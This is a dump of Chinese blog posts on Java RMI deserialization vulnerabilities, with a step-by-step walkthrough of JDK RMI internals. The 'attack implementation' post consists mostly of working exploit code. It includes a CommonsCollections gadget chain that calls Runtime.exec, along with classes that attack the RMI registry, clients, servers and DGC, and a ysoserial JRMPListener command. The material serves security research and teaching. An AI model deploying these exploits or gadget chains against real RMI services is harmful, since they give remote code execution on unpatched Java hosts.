参考链接https://xz.aliyun.com/t/7932https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/https://mogwailabs.de/en/blog/2020/02/an-trinhs-rmi-registry-bypass/https://blog.0kami.cn/2020/02/06/java/rmi-registry-security-problem/http://blog.nsfocus.net/registry-whitelist-bypass-0424/","categories":[],"tags":[]},{"title":"RMI反序列化漏洞之三顾茅庐-攻击实现","slug":"RMI反序列化漏洞之三顾茅庐-攻击实现","date":"2021-11-02T01:59:11.000Z","updated":"2021-11-18T11:51:45.772Z","comments":true,"path":"2021/11/02/RMI反序列化漏洞之三顾茅庐-攻击实现/","link":"","permalink":"http://yoursite.com/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/","excerpt":"前一篇文章整理了RMI调用的流程，大致分析了其中可能存在的反序列化攻击点，这篇来具体实现下这些攻击。但注意这些都是demo，存在被反打的风险，谨慎使用。","text":"前一篇文章整理了RMI调用的流程，大致分析了其中可能存在的反序列化攻击点，这篇来具体实现下这些攻击。但注意这些都是demo，存在被反打的风险，谨慎使用。所有的反序列化攻击都需要被攻击方本地存在gadget，为了演示手动添加了CommonsCollections依赖。另外为了逻辑清晰本文只分析反序列化攻击，不涉及JNDI注入。 客户端/服务端攻击注册中心首先看下攻击注册中心的方法，这里把客户端和服务端写在一起，因为从前面的流程已经分析过，实际上对注册中心来说并没有具体区分客户端和服务端，只是调用的函数不同罢了。调用lookup就代表是客户端，调用bind就代表是服务端。既然要攻击注册中心，那么反序列化点自然是在注册中心里，也就是Registryimpl_Skel#dispatch。实际上这里面有反序列化点的都能打，先看看lookup。正常使用应该是客户端调用RegistryImpl_Stub里面的lookup 12345678910111213public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException &#123; try &#123; RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L); try &#123; ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(var1); &#125; catch (IOException var18) &#123; throw new MarshalException(&quot;error marshalling arguments&quot;, var18); &#125; super.ref.invoke(var2); ...... 实际上ref.invoke就已经将客户端的数据传过去了，所以后面的代码对攻击不重要。这里有个问题，就是正常来说这个功能只接受字符串作为参数，那么skel那里也只会反序列化一个字符串，看上去是不能利用的。但实际上客户端已经获取到RegistryImpl_Stub了，也就获取到了里面的ref，自己实现一个lookup把恶意对象发过去就行了.同样的道理，服务端攻击注册中心就是重新写个bind之类的，直接上代码，加个cc依赖弹计算器: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273public class RegistryExploit &#123; public static void main(String[] args) throws Exception&#123; RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); lookup(registry);// bind(registry); &#125; public static void lookup(RegistryImpl_Stub registry) throws Exception &#123; Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass(); Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;); refField.setAccessible(true); UnicastRef ref = (UnicastRef) refField.get(registry); Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;; RemoteCall var2 = ref.newCall(registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(genEvilMap()); ref.invoke(var2); &#125; public static void bind(RegistryImpl_Stub registry) throws Exception &#123; Class RemoteObjectClass = registry.getClass().getSuperclass().getSuperclass(); Field refField = RemoteObjectClass.getDeclaredField(&quot;ref&quot;); refField.setAccessible(true); UnicastRef ref = (UnicastRef) refField.get(registry); Operation[] operations = new Operation[]&#123;new Operation(&quot;void bind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;java.lang.String list()[]&quot;), new Operation(&quot;java.rmi.Remote lookup(java.lang.String)&quot;), new Operation(&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;), new Operation(&quot;void unbind(java.lang.String)&quot;)&#125;; RemoteCall var3 = ref.newCall(registry, operations, 0, 4905912898345647071L); ObjectOutput var4 = var3.getOutputStream(); var4.writeObject(&quot;test&quot;); var4.writeObject(genEvilMap()); ref.invoke(var3); &#125; public static HashMap genEvilMap() throws Exception&#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;); HashMap&lt;Object, Object&gt; map2 = new HashMap&lt;&gt;(); map2.put(tiedMapEntry, &quot;bbb&quot;); lazyMap.remove(&quot;aaa&quot;); Class c = LazyMap.class; Field factoryField = c.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap,chainedTransformer); return map2; &#125;&#125; bind那里也可以自己加一层代理变成Remote对象然后调用原生的bind方法。另外为了简单这个代码调用了UnicastRef#invoke，也就是实际上是可能被反打的。 注册中心攻击客户端反过来注册中心也是可以打与它通信的对象，Registry_impl_Stub中的lookup和list两个方法调用了readObject，会反序列化查询到的Stub对象。那么在注册中心绑定恶意对象，客户端调用registry.lookup/list的时候就能攻击客户端： 12345678910111213141516public class EvilRegistry &#123; public static void main(String[] args) throws Exception &#123; new RemoteObjImpl(); Remote remoteObj = new RemoteWrapper(); Registry r = LocateRegistry.createRegistry(1099); r.bind(&quot;remoteObj&quot;,remoteObj); &#125;&#125;class RemoteWrapper implements Remote, Serializable &#123; private Map map; RemoteWrapper() throws Exception &#123; this.map = genEvilMap(); &#125;&#125; 因为bind需要Remote对象，所以封装了一个类。这里虽然客户端上没有这个Wrapper类，但反序列化是从里往外的，在报错之前里面的恶意Map已经反序列化完成了。另外如果不发布一个真的远程对象程序就直接运行结束了，所以new了一个RemoteObjImpl。而注册中心Stub中并没有显式的反序列化点可以攻击服务端。 客户端攻击服务端之前分析客户端调用服务端远程对象的过程，服务端的UnicastServerRef#dispatch调用了unmarshalValue。那么客户端把参数设置成payload就能攻击了，当然前提是服务端接收的参数类型不能是基础类型。如果接收参数是Object，那就很简单，直接传恶意对象就行了。但如果是String之类的，从代码上看也是能攻击的，但是不能直接传payload，那么看一下应该怎么写。很容易想到，我在客户端重新定义一个接收Object的远程方法试试： 1234public interface IRemoteObj extends Remote &#123; //sayHello就是客户端要调用的方法，需要抛出RemoteException public String sayHello(Object keywords) throws RemoteException;&#125; 将方法参数改成Object后，运行客户端，报错java.rmi.UnmarshalException: unrecognized method hash: method not supported by remote object直接搜一下这个报错在哪，发现在UnicastServerRef#dispatch。 12345678910111213141516171819202122232425262728293031323334353637383940414243public void dispatch(Remote obj, RemoteCall call) throws IOException &#123; // positive operation number in 1.1 stubs; // negative version number in 1.2 stubs and beyond... int num; long op; try &#123; // read remote call header ObjectInput in; try &#123; in = call.getInputStream(); num = in.readInt(); if (num &gt;= 0) &#123; if (skel != null) &#123; oldDispatch(obj, call, num); return; &#125; else &#123; throw new UnmarshalException( &quot;skeleton class not found but required &quot; + &quot;for client version&quot;); &#125; &#125; op = in.readLong(); &#125; catch (Exception readEx) &#123; throw new UnmarshalException(&quot;error unmarshalling call header&quot;, readEx); &#125; /* * Since only system classes (with null class loaders) will be on * the execution stack during parameter unmarshalling for the 1.2 * stub protocol, tell the MarshalInputStream not to bother trying * to resolve classes using its superclasses&#x27;s default method of * consulting the first non-null class loader on the stack. */ MarshalInputStream marshalStream = (MarshalInputStream) in; marshalStream.skipDefaultResolveClass(); Method method = hashToMethod_Map.get(op); if (method == null) &#123; throw new UnmarshalException(&quot;unrecognized method hash: &quot; + &quot;method not supported by remote object&quot;); &#125; 将这个hash值改成hashToMethod_Map里面的hash就行了。但正常来说这个hash值也是不好找的，所以尝试找到计算hash值的地方。跟一下客户端的调用流程，RemoteObjectInvocationHandler#invoke 123456789101112131415161718192021222324252627282930313233private Object invokeRemoteMethod(Object proxy, Method method, Object[] args) throws Exception&#123; try &#123; if (!(proxy instanceof Remote)) &#123; throw new IllegalArgumentException( &quot;proxy not Remote instance&quot;); &#125; return ref.invoke((Remote) proxy, method, args, getMethodHash(method)); &#125; catch (Exception e) &#123; if (!(e instanceof RuntimeException)) &#123; Class&lt;?&gt; cl = proxy.getClass(); try &#123; method = cl.getMethod(method.getName(), method.getParameterTypes()); &#125; catch (NoSuchMethodException nsme) &#123; throw (IllegalArgumentException) new IllegalArgumentException().initCause(nsme); &#125; Class&lt;?&gt; thrownType = e.getClass(); for (Class&lt;?&gt; declaredType : method.getExceptionTypes()) &#123; if (declaredType.isAssignableFrom(thrownType)) &#123; throw e; &#125; &#125; e = new UnexpectedException(&quot;unexpected exception&quot;, e); &#125; throw e; &#125;&#125; 看到了ref.invoke传递的getMethodHash(method)，那么在这改method就可以了。为了方便直接调试改值试试，这里好像默认用的是系统类加载器，改成用AppClassLoader才能找到自定义的接口。调用remoteObj.sayHello(evilMap)，在getMethodHash下断点 1methos = ClassLoader.getSystemClassLoader().loadClass(&quot;org.example.IRemoteObj&quot;).getDeclaredMethod(&quot;sayHello&quot;,String.class) 修改后就能成功在服务端反序列化了。其实也可以和打注册中心一样重新写个invoke，反正最后都是调用UnicastRef#invoke。 12345678910111213141516171819202122232425 public static void main(String[] args) throws Exception &#123; RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;);// HashMap evilMap = genEvilMap();// remoteObj.sayHello(evilMap); invoke(remoteObj); &#125; public static void invoke(IRemoteObj remoteObj) throws Exception&#123; Field hField = remoteObj.getClass().getSuperclass().getDeclaredField(&quot;h&quot;); hField.setAccessible(true); Object remoteObjectInvocationHandler = hField.get(remoteObj); Field refField = remoteObjectInvocationHandler.getClass().getSuperclass().getDeclaredField(&quot;ref&quot;); refField.setAccessible(true); UnicastRef ref = (UnicastRef) refField.get(remoteObjectInvocationHandler); Method method = IRemoteObj.class.getDeclaredMethod(&quot;sayHello&quot;, String.class); Method methodToHash_mapsMethod = remoteObjectInvocationHandler.getClass().getDeclaredMethod(&quot;getMethodHash&quot;,Method.class); methodToHash_mapsMethod.setAccessible(true); long hash = (long) methodToHash_mapsMethod.invoke(remoteObj, method); ref.invoke(remoteObj, method, new Object[]&#123;genEvilMap()&#125;, hash); &#125; 这个攻击场景的前提是知道服务端开放的远程方法，并且参数类型不是基础类型。 服务端攻击客户端顺便看看反过来的情况，前面已经分析了，客户端会调用UnicastRef#invoke，其中对服务端返回的函数调用unmarshalValue对返回值进行了反序列化，那么在服务端返回一个恶意对象就可以攻击客户端。和客户端类似，如果返回值是Object的当然可以直接打，如果接口的返回值不是Object，就得重写一个服务端了。比较麻烦，实际意义不大，这里就不实现了。 DGC相关的攻击上一篇文章分析过，DGC双向都有反序列化操作，先分析攻击DGC服务端。思路是获取DGCImpl_Stub对象，重写dirty方法，在DGCImpl_Skel#dispatch中触发反序列化，跟打注册中心的差不多，稍微麻烦点。 123456789101112131415161718192021222324252627282930313233343536373839404142public class DGCExploit &#123; public static void main(String[] args) throws Exception&#123; RegistryImpl_Stub registry = (RegistryImpl_Stub) LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); Class c = registry.getClass().getSuperclass().getSuperclass(); Field refField = c.getDeclaredField(&quot;ref&quot;); refField.setAccessible(true); UnicastRef unicastRef = (UnicastRef) refField.get(registry); Class c2 = unicastRef.getClass(); Field refField2 = c2.getDeclaredField(&quot;ref&quot;); refField2.setAccessible(true); LiveRef liveRef = (LiveRef) refField2.get(unicastRef); Class c3 = liveRef.getClass(); Field epField = c3.getDeclaredField(&quot;ep&quot;); epField.setAccessible(true); TCPEndpoint tcpEndpoint = (TCPEndpoint) epField.get(liveRef); Class c4 = Class.forName(&quot;sun.rmi.transport.DGCClient$EndpointEntry&quot;); Method lookupMethod = c4.getDeclaredMethod(&quot;lookup&quot;, Endpoint.class); lookupMethod.setAccessible(true); Object endpointEntry = lookupMethod.invoke(null, tcpEndpoint); Class c5 = endpointEntry.getClass(); Field dgcField = c5.getDeclaredField(&quot;dgc&quot;); dgcField.setAccessible(true); RemoteObject dgc = (RemoteObject) dgcField.get(endpointEntry); Class c6 = dgc.getClass().getSuperclass().getSuperclass(); Field refField3 = c6.getDeclaredField(&quot;ref&quot;); refField3.setAccessible(true); UnicastRef unicastRef2 = (UnicastRef) refField3.get(dgc); Operation[] operations = new Operation[]&#123;new Operation(&quot;void clean(java.rmi.server.ObjID[], long, java.rmi.dgc.VMID, boolean)&quot;), new Operation(&quot;java.rmi.dgc.Lease dirty(java.rmi.server.ObjID[], long, java.rmi.dgc.Lease)&quot;)&#125;; RemoteCall var5 = unicastRef2.newCall(dgc, operations, 1, -669196253586618813L); ObjectOutput var6 = var5.getOutputStream(); var6.writeObject(genEvilMap()); unicastRef2.invoke(var5); &#125;&#125; 其实ysoserial中的exploit/JRMPClient是相同的功能，ysoserial里的实现方法是用socket重写jrmp协议。同样也可以打DGC客户端，在DGCImpl_Stub触发反序列化，一样是意义不大，实现起来麻烦，因为打客户端可以用更通用的executeCall处的反序列化。 攻击JRMP客户端前面分析过，只要客户端的stub发起JRMP请求，就会调用UnicastRef#invoke，也就会调用StreamRemoteCall#executeCall，导致被反序列化攻击。这里想实现攻击需要自己实现一个恶意服务端，把返回的异常信息改成payload，其实这就是ysoserial里面的exploit/JRMPListener实现的功能。具体实现大概就是从TCPTransport#run0拷过来，没用的删删，改改最后处理的地方。具体使用是先启动监听 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollecitons6 calc.exe 然后客户端只要调用任意一个stub，触发UnicastRef#invoke就会被攻击，比如调用注册中心stub 12Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;); 所以如果扫到开放了1099端口就连，是有可能直接中招的。毕竟社会险恶。这篇文章介绍了常用的针对RMI的攻击的具体实现。但随着JDK的安全更新，许多攻击方式也随之失效。针对这些安全加固措施，后面的文章会分析一些已有的绕过方式，以及个人所作的尝试。 参考链接https://xz.aliyun.com/t/7930https://github.com/wh1t3p1g/ysomaphttps://mp.weixin.qq.com/s/M_-lWKb9xO6u2MxRaEQ--Qhttps://su18.org/post/rmi-attackhttp://blog.nsfocus.net/java-deserialization-vulnerability-overlooked-mass-destruction/","categories":[],"tags":[]},{"title":"RMI反序列化漏洞之三顾茅庐-流程分析","slug":"RMI反序列化漏洞之三顾茅庐-流程分析","date":"2021-10-26T01:59:11.000Z","updated":"2021-11-18T11:51:22.251Z","comments":true,"path":"2021/10/26/RMI反序列化漏洞之三顾茅庐-流程分析/","link":"","permalink":"http://yoursite.com/2021/10/26/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/","excerpt":"最近分析了下RMI相关的反序列化漏洞，查资料时发现许多分析文章都只关注漏洞点，对功能本身语焉不详。所以这篇文章先具体分析下RMI整体的调用流程，并且点出一些可能出现反序列化问题的地方。下篇写具体的漏洞利用。","text":"最近分析了下RMI相关的反序列化漏洞，查资料时发现许多分析文章都只关注漏洞点，对功能本身语焉不详。所以这篇文章先具体分析下RMI整体的调用流程，并且点出一些可能出现反序列化问题的地方。下篇写具体的漏洞利用。RMI全称Remote Method Invocation，远程方法调用，功能是跨jvm调用远程方法。实现RMI的协议叫JRMP，RMI实现的过程中进行了java对象的传递，自然使用了序列化和反序列化，也自然产生了反序列化漏洞。概述下RMI的流程，RMI里有三个角色：客户端、服务端、注册中心。设计上客户端和服务端不直接通信，而是通过注册中心通信。简单理解三者的关系如下：服务端创建远程对象，并将远程对象在注册中心注册，客户端到注册中心端查找并获取对应的远程对象，最终在服务端调用其方法。具体实现时，客户端没有直接调用服务器上的对象，也没有直接调用注册中心上的对象，而是操作一个进行网络通信的代理类叫Stub，服务端也一样有一个类似的代理类叫Skel，具体操作都是这两个代理类进行的。RMI的大致流程可以参考https://www.ibm.com/docs/en/sdk-java-technology/8?topic=iiop-rmi-implementation分析之前先写一个最简单的RMI Demo，直观的感受一下使用的方式。首先需要定义远程对象类。远程方法调用不是所有类都可以，想进行远程方法调用的类，需要实现一个继承Remote接口的接口，远程方法要抛RemoteException。先定义这个接口： 1234public interface IRemoteObj extends Remote &#123; //sayHello就是客户端要调用的方法，需要抛出RemoteException public String sayHello() throws RemoteException;&#125; 然后创建远程对象的实现类。为了后续的远程调用，服务端需要把远程对象发布出去，发布的方法有两种：1、继承UnicastRemoteObject对象2、自己调用UnicastRemoteObject.exportObject方法实际上两种方法是一样的，UnicastRemoteObject的构造方法最后也是调用了exportObject那么定义远程对象类： 12345678910111213public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj &#123; public RemoteObjImpl() throws RemoteException &#123; //UnicastRemoteObject.exportObject(this, 0);//如果不继承UnicastRemoteObject就需要手工发布 &#125; @Override public String sayHello() &#123; String name = this.getClass().getName(); System.out.println(name); return name; &#125;&#125; 然后就可以创建服务端和客户端了，服务端一般和注册中心写在一起，做如下几件事：1、首先创建远程对象，创建时也会进行远程对象的发布。2、创建注册中心3、将远程对象绑定到注册中心 1234567public class RMIServer &#123; public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123; RemoteObjImpl remoteObj = new RemoteObjImpl(); Registry r = LocateRegistry.createRegistry(1099); r.bind(&quot;remoteObj&quot;,remoteObj); &#125;&#125; 然后是客户端，做以下几件事：1、获取“注册中心”对象2、利用注册中心对象获取远程对象3、调用远程对象上的方法 1234567public class RMIClient &#123; public static void main(String[] args) throws RemoteException, NotBoundException &#123; Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); IRemoteObj remoteObj = (IRemoteObj) registry.lookup(&quot;remoteObj&quot;); remoteObj.sayHello(); &#125;&#125; 执行客户端的main方法后，代码实际是在服务端执行的，客户端可以获取执行结果。一共有六行代码，那么接下来开始调试观察整个过程，调试时jdk版本是8u65和8u141交替用的，可能有部分代码对不上，但大致逻辑不变。另外由于rmi大部分代码在sun包下面，需要去openjdk下载对应的源码，不然就只能看反编译的var1变量名猜谜语了。 创建远程对象首先是RemoteObjImpl remoteObj = new RemoteObjImpl();这一行，调用父类UnicastRemoteObject的构造方法。注意这里并没有接收返回值，只是将远程对象发布出去。 12345678910protected UnicastRemoteObject() throws RemoteException &#123; this(0); &#125;protected UnicastRemoteObject(int port) throws RemoteException &#123; this.port = port; exportObject((Remote) this, port); &#125; 跟进exportObject 12345public static Remote exportObject(Remote obj, int port) throws RemoteException &#123; return exportObject(obj, new UnicastServerRef(port)); &#125; 出现了一个新的类UnicastServerRef，它代表远程对象的引用。这个类继承了Dispatcher接口，代表由它分发客户端的操作给远程对象。跟进这个类的构造方法： 123public UnicastServerRef(int port) &#123; super(new LiveRef(port));&#125; 又出现了一个新的类LiveRef，那再跟进它的构造方法： 12345678910111213public LiveRef(int port) &#123; this((new ObjID()), port);&#125;public LiveRef(ObjID objID, int port) &#123; this(objID, TCPEndpoint.getLocalEndpoint(port), true);&#125;public LiveRef(ObjID objID, Endpoint endpoint, boolean isLocal) &#123; ep = endpoint; id = objID; this.isLocal = isLocal;&#125; objID就是一个数字id，不重要。主要看又出现的一个类TCPEndpoint，这个名字很明显和网络通信有关了，跟进TCPEndpoint#getLocalEndpoint方法： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public static TCPEndpoint getLocalEndpoint(int port) &#123; return getLocalEndpoint(port, null, null);&#125;public static TCPEndpoint getLocalEndpoint(int port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf)&#123; /* * Find mapping for an endpoint key to the list of local unique * endpoints for this client/server socket factory pair (perhaps * null) for the specific port. */ TCPEndpoint ep = null; synchronized (localEndpoints) &#123; TCPEndpoint endpointKey = new TCPEndpoint(null, port, csf, ssf); LinkedList&lt;TCPEndpoint&gt; epList = localEndpoints.get(endpointKey); String localHost = resampleLocalHost(); if (epList == null) &#123; /* * Create new endpoint list. */ ep = new TCPEndpoint(localHost, port, csf, ssf); epList = new LinkedList&lt;TCPEndpoint&gt;(); epList.add(ep); ep.listenPort = port; ep.transport = new TCPTransport(epList); localEndpoints.put(endpointKey, epList); if (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123; TCPTransport.tcpLog.log(Log.BRIEF, &quot;created local endpoint for socket factory &quot; + ssf + &quot; on port &quot; + port); &#125; &#125; else &#123; synchronized (epList) &#123; ep = epList.getLast(); String lastHost = ep.host; int lastPort = ep.port; TCPTransport lastTransport = ep.transport; // assert (localHost == null ^ lastHost != null) if (localHost != null &amp;&amp; !localHost.equals(lastHost)) &#123; /* * Hostname has been updated; add updated endpoint * to list. */ if (lastPort != 0) &#123; /* * Remove outdated endpoints only if the * port has already been set on those endpoints. */ epList.clear(); &#125; ep = new TCPEndpoint(localHost, lastPort, csf, ssf); ep.listenPort = port; ep.transport = lastTransport; epList.add(ep); &#125; &#125; &#125; &#125; return ep;&#125; 这里比较绕，其实关注主要逻辑就行，最后返回的是一个TCPEndPoint，看下这个类的属性 1234567891011121314151617181920212223242526/** * TCPEndpoint represents some communication endpoint for an address * space (VM). * * @author Ann Wollrath */public class TCPEndpoint implements Endpoint &#123; /** IP address or host name */ private String host; /** port number */ private int port; /** custom client socket factory (null if not custom factory) */ private final RMIClientSocketFactory csf; /** custom server socket factory (null if not custom factory) */ private final RMIServerSocketFactory ssf; /** if local, the port number to listen on */ private int listenPort = -1; /** if local, the transport object associated with this endpoint */ private TCPTransport transport = null; /** the local host name */ private static String localHost; /** true if real local host name is known yet */ private static boolean localHostKnown; 很明显是一个和网络请求有关的类，主要属性就是域名，端口，还有一个TCPTransport。TCPTransport是真正的处理网络请求的类，这里实际上将TCPEndPoint和TCPTransport进行了绑定。所以LiveRef里面就是放了一个TCPEndPoint。那么LiveRef可以理解为一个封装了ip和端口的辅助类。另外注意LiveRef是不能序列化的，也就是说并不需要通过序列化方式传递它，只需要传递里面的id、ip和端口信息就行。实际上实例化一个LiveRef只需要ip和端口就够了： 1new LiveRef(new ObjID(),new TCPEndpoint(ip,port),true) 之后回到UnicastServerRef的构造函数那里，调用了父类构造函数 123public UnicastServerRef(int port) &#123; super(new LiveRef(port));&#125; 也就是UnicastRef的构造函数，一个单纯的赋值。 123public UnicastRef(LiveRef liveRef) &#123; ref = liveRef;&#125; 然后创建这一大堆类的过程就结束了，回到了exportObject中来。这里可以简单总结一下前面这些类的关系，有点乱。这里用idea生成个类图： LiveRef、TCPEndoPint、TCPTransport是处理网络通信的类。UnicastRef、UnicastServerRef是远程对象的引用对象，是宏观上处理网络请求的类，也是实现RMI调用的核心逻辑的类。UnicastRemoteObject就是远程对象的基础类，它并不直接处理网络请求，而是通过里面的UnicastServerRef处理。目前其实就创建了一个UnicastServerRef，它的ref是了一个LiveRef，ref里面有一个TCPEndpoint叫ep，ep里面有个TCPTransport叫transport。继续跟进UnicastRemoteObject#exportObject(Remote obj, UnicastServerRef sref) 123456789private static Remote exportObject(Remote obj, UnicastServerRef sref) throws RemoteException&#123; // if obj extends UnicastRemoteObject, set its ref. if (obj instanceof UnicastRemoteObject) &#123; ((UnicastRemoteObject) obj).ref = sref; &#125; return sref.exportObject(obj, null, false);&#125; 这里把远程对象的ref赋值成刚才新建的那个UnicastServerRef，然后调用了UnicastServerRef#exportObject 1234567891011121314151617181920212223public Remote exportObject(Remote impl, Object data, boolean permanent) throws RemoteException &#123; Class&lt;?&gt; implClass = impl.getClass(); Remote stub; try &#123; stub = Util.createProxy(implClass, getClientRef(), forceStubUse); &#125; catch (IllegalArgumentException e) &#123; throw new ExportException( &quot;remote object implements illegal remote interface&quot;, e); &#125; if (stub instanceof RemoteStub) &#123; setSkeleton(impl); &#125; Target target = new Target(impl, this, stub, ref.getObjID(), permanent); ref.exportObject(target); hashToMethod_Map = hashToMethod_Maps.get(implClass); return stub; &#125; 这里出现了stub这个变量，很明显这是一个代理类，先看下getClientRef，其实就是新建个UnicastRef，把刚才那个LiveRef放进去。 123protected RemoteRef getClientRef() &#123; return new UnicastRef(ref);&#125; 跟进Util.createProxy方法 123456789101112131415161718192021222324252627282930313233343536373839public static Remote createProxy(Class&lt;?&gt; implClass, RemoteRef clientRef, boolean forceStubUse) throws StubNotFoundException&#123; Class&lt;?&gt; remoteClass; try &#123; remoteClass = getRemoteClass(implClass); &#125; catch (ClassNotFoundException ex ) &#123; throw new StubNotFoundException( &quot;object does not implement a remote interface: &quot; + implClass.getName()); &#125; if (forceStubUse || !(ignoreStubClasses || !stubClassExists(remoteClass))) &#123; return createStub(remoteClass, clientRef); &#125; final ClassLoader loader = implClass.getClassLoader(); final Class&lt;?&gt;[] interfaces = getRemoteInterfaces(implClass); final InvocationHandler handler = new RemoteObjectInvocationHandler(clientRef); /* REMIND: private remote interfaces? */ try &#123; return AccessController.doPrivileged(new PrivilegedAction&lt;Remote&gt;() &#123; public Remote run() &#123; return (Remote) Proxy.newProxyInstance(loader, interfaces, handler); &#125;&#125;); &#125; catch (IllegalArgumentException e) &#123; throw new StubNotFoundException(&quot;unable to create proxy&quot;, e); &#125;&#125; 这是创建stub的逻辑，比较重要。首先判断当前的RemoteObjImpl这个类是否实现了Remote接口，然后判断是否存在该类的Stub类，也就是是否存在RemoteObjImpl_Stub名称的类，如果存在就调用createStub直接实例化一个。 1234567891011121314151617181920private static RemoteStub createStub(Class&lt;?&gt; remoteClass, RemoteRef ref) throws StubNotFoundException&#123; String stubname = remoteClass.getName() + &quot;_Stub&quot;; /* Make sure to use the local stub loader for the stub classes. * When loaded by the local loader the load path can be * propagated to remote clients, by the MarshalOutputStream/InStream * pickle methods */ try &#123; Class&lt;?&gt; stubcl = Class.forName(stubname, false, remoteClass.getClassLoader()); Constructor&lt;?&gt; cons = stubcl.getConstructor(stubConsParamTypes); return (RemoteStub) cons.newInstance(new Object[] &#123; ref &#125;); &#125; catch ......&#125; 目前系统里是没有这个类的，所以往下走，看到实际是创建了一个动态代理类，调用处理器用的是RemoteObjectInvocationHandler，把刚才创建那个UnicastRef放了进去。之前创建的远程对象里有个UnicastServerRef，这个stub里面有个UnicastRef，但它们两个里面是同一个LiveRef。毕竟这个代理对象就是代表远程对象的。所以远程对象的Stub其实就是个动态代理，那么远程调用方法时就是调它的invoke方法，后续调用到的时候再分析。stub是要传给客户端使用的，客户端通过操作stub的UnicastRef，来调用服务端远程对象的UnicastServerRef，是一个对称关系。接下来判断这个Stub是否属于RemoteStub，如果是就调用setSkeleton。RemoteStub是jdk里内置的几个通用类，有Activation$ActivationSystemImpl_StubActivationGroup_StubDGCImpl_StubRMIConnectionImpl_StubRMIServerImpl_StubReferenceWrapper_StubRegistryImpl_Stub这几个，那么这里显然会跳过。之后会创建Target，这又是一个新的类，跟进它的构造方法： 1234567891011121314151617181920212223242526272829303132333435public Target(Remote impl, Dispatcher disp, Remote stub, ObjID id, boolean permanent)&#123; this.weakImpl = new WeakRef(impl, ObjectTable.reapQueue); this.disp = disp; this.stub = stub; this.id = id; this.acc = AccessController.getContext(); /* * Fix for 4149366: so that downloaded parameter types unmarshalled * for this impl will be compatible with types known only to the * impl class&#x27;s class loader (when it&#x27;s not identical to the * exporting thread&#x27;s context class loader), mark the impl&#x27;s class * loader as the loader to use as the context class loader in the * server&#x27;s dispatch thread while a call to this impl is being * processed (unless this exporting thread&#x27;s context class loader is * a child of the impl&#x27;s class loader, such as when a registry is * exported by an application, in which case this thread&#x27;s context * class loader is preferred). */ ClassLoader threadContextLoader = Thread.currentThread().getContextClassLoader(); ClassLoader serverLoader = impl.getClass().getClassLoader(); if (checkLoaderAncestry(threadContextLoader, serverLoader)) &#123; this.ccl = threadContextLoader; &#125; else &#123; this.ccl = serverLoader; &#125; this.permanent = permanent; if (permanent) &#123; pinImpl(); &#125;&#125; Target可以理解为是一个远程服务实例，一个Target对应一个远程对象。里面保存了远程对象实例、对应的Stub、对应的远程引用对象UnicastServerRef，之前创建的LiveRef的ObjID。实际上Target就是用LiveRef的ObjID代表了这个远程对象，一个远程对象和一个LiveRef是绑定的。这里就包括了远程调用所需的全部对象了，远程调用就是Stub使用远程引用来调用远程对象上的方法。创建完Target后调用到ref也就是LiveRef#exportObject 123public void exportObject(Target target) throws RemoteException &#123; ep.exportObject(target);&#125; 调用了TCPEndPoint#exportObject 123public void exportObject(Target target) throws RemoteException &#123; transport.exportObject(target);&#125; 又调用了TCPTransport#exportObject 12345678910111213141516171819202122232425262728public void exportObject(Target target) throws RemoteException &#123; /* * Ensure that a server socket is listening, and count this * export while synchronized to prevent the server socket from * being closed due to concurrent unexports. */ 